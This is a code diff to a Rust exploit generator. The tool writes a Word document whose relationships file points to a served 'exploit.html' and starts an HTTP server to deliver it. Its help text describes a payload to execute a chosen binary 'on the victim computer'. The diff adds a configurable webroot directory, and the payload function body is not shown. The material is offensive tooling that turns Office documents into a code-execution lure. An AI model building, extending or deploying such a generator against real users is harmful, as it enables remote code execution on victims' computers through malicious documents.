@@ -1,4 +1,3 @@
-//extern crate local_ip;
 pub mod local_ip;
 pub mod parse_args;
 
@@ -34,6 +33,13 @@ fn main() {
     }
     let docx_name = "document.docx".to_string();
     let html_name = "exploit.html".to_string();
+    let opt_webroot = parse_args::get_flag_value("webroot", &vec_flag);
+    let webroot_string = match opt_webroot {
+        Some(value) => value,
+        None => "./www".to_string(),
+    };
+    let webroot = &webroot_string[..];
+
     let mut start_httpd = true;
 
     let opt_binary = parse_args::get_flag_value("binary", &vec_flag);
@@ -95,10 +101,10 @@ Configuration:
 
     let payload_url = format!("http://{}:{}/exploit.html", ip, port);
 
-    let _ = create_dir_all("./www");
+    let _ = create_dir_all(webroot);
 
-    let _ = generate_html(html_name, binary);
-    let _ = generate_docx(docx_name, payload_url);
+    let _ = generate_html(html_name, binary, webroot);
+    let _ = generate_docx(docx_name, payload_url, webroot);
 
     if start_httpd == true {
         let socket: SocketAddr;
@@ -117,7 +123,7 @@ Configuration:
         let is_socket_free = test_socket(&socket);
         match is_socket_free {
             Ok(_) => {
-                start(&socket, "./www");
+                start(&socket, webroot);
             }
             Err(value) => {
                 println!("{}", value);
@@ -126,8 +132,8 @@ Configuration:
         }
     } else {
         println!(
-            "\nNo server started. Please copy ./www/exploit.html to the webserver at {} on port {}",
-            ip, port
+            "\nNo server started. Please copy {}/exploit.html to the webserver at {} on port {}",
+            webroot, ip, port
         );
     }
 }
@@ -143,6 +149,8 @@ Options:
                             # Default value \"127.0.0.1\"
         --port=portnumber   # Bind server to provided port
                             # Default value \"8080\"
+        --webroot=webpath   # Specify where files are generated
+                            # Default value \"./www\"
         --binary=binarypath # Make a payload to execue binarypath on the victime computer
                             # Default value \"\\\\\\\\windows\\\\\\\\system32\\\\\\\\calc\"
                             # Binary path should not include the file extention e.g. .exe
@@ -153,8 +161,8 @@ Options:
         -h or --help        # print this message ", cmd);
 }
 
-fn generate_docx(docx_name: String, payload_url: String) {
-    let filename = format!("./www/{}", docx_name);
+fn generate_docx(docx_name: String, payload_url: String, webroot: &str) {
+    let filename = format!("{}/{}", webroot, docx_name);
     let relsfile = "docx/word/_rels/document.xml.rels";
 
     let _ = write(relsfile, tpl(payload_url));
@@ -174,11 +182,11 @@ fn test_socket(socket: &SocketAddr) -> Result<(), String> {
     };
 }
 
-fn generate_html(html_name: String, binary: &str) {
-    let filename = format!("./www/{}", html_name);
+fn generate_html(html_name: String, binary: &str, webroot: &str) {
+    let filename = format!("{}/{}", webroot, html_name);
 
     let _ = write(filename, html(binary));
-    println!("Created ./www/{}", html_name);
+    println!("Created {}/{}", webroot, html_name);
 }
 
 fn payload(binary: &str) -> String {
